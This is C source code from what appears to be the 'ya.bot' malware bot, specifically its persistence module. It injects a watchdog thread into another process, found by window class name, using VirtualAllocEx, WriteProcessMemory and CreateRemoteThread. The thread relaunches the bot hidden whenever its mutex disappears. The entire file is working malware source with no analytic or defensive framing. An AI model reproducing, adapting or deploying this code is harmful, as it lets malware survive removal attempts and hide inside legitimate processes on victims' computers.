/*  ya.bot  */

#include "bot.h"

#ifndef NO_PERSIST
DWORD WINAPI persist_thread(SPersistInfo *s_pi)
{
	HANDLE hFile, hMutex;
		hFile = s_pi->m_fCreateFileA(s_pi->m_szFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	while (TRUE)
	{
			hMutex = s_pi->m_fCreateMutexA(NULL, FALSE, s_pi->m_szMutexName);
		if (s_pi->m_fGetLastError() != ERROR_ALREADY_EXISTS)
		{
				s_pi->m_fCloseHandle(hFile);
				s_pi->m_fReleaseMutex(hMutex);
				s_pi->m_fCloseHandle(hMutex);
				s_pi->m_fWinExec(s_pi->m_szFilePath, SW_HIDE);
				return 0;
		}
			s_pi->m_fReleaseMutex(hMutex);
			s_pi->m_fCloseHandle(hMutex);
			s_pi->m_fSleep(60000);
	}
		return 0;
}

void persist_calc(void) 
{
}

bool persist_main(char *pszMutexName)
{
	char szFilePath[MAX_PATH];
	DWORD dwPID, dwWritten, *pdwRemoteCode;
	HANDLE hProcess;
	HMODULE hModule;
	int nSize;
		hModule = GetModuleHandle(string_kernel32library);
	SPersistInfo *s_pir, s_pil = 
	{
			(pCloseHandle)GetProcAddress(hModule, string_persistclosehandle),
			(pCreateFileA)GetProcAddress(hModule, string_persistcreatefilea),
			(pCreateMutexA)GetProcAddress(hModule, string_persistcreatemutexa),
			(pGetLastError)GetProcAddress(hModule, string_persistgetlasterror),
			(pReleaseMutex)GetProcAddress(hModule, string_persistreleasemutex),
			(pSleep)GetProcAddress(hModule, string_persistsleep),
			(pWinExec)GetProcAddress(hModule, string_persistwinexec),
	};

#ifndef NO_DEBUG
		debug_print("Injecting persist thread, persist_main()");
#endif

		GetWindowThreadProcessId(FindWindow(string_persistclassname, NULL), &dwPID);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (!hProcess)
			return FALSE;
		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
		strncpy(s_pil.m_szFilePath, szFilePath, sizeof(s_pil.m_szFilePath) - 1);
		strncpy(s_pil.m_szMutexName, pszMutexName, sizeof(s_pil.m_szMutexName) - 1);
		s_pir = (SPersistInfo *)VirtualAllocEx(hProcess,
				NULL,
				sizeof(SPersistInfo),
				MEM_COMMIT,
				PAGE_READWRITE);
		WriteProcessMemory(hProcess, s_pir, &s_pil, sizeof(SPersistInfo), &dwWritten);
		nSize = ((LPBYTE)persist_calc - (LPBYTE)persist_thread);
		pdwRemoteCode = (PDWORD)VirtualAllocEx(hProcess,
				NULL,
				nSize,
				MEM_COMMIT,
				PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(hProcess, pdwRemoteCode, &persist_thread, nSize, &dwWritten);
		g_hPersistThread = CreateRemoteThread(hProcess,
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)pdwRemoteCode,
				s_pir,
				0,
				NULL);
		CloseHandle(hProcess);
	if (!g_hPersistThread)
			return FALSE;
		return TRUE;
}
#endif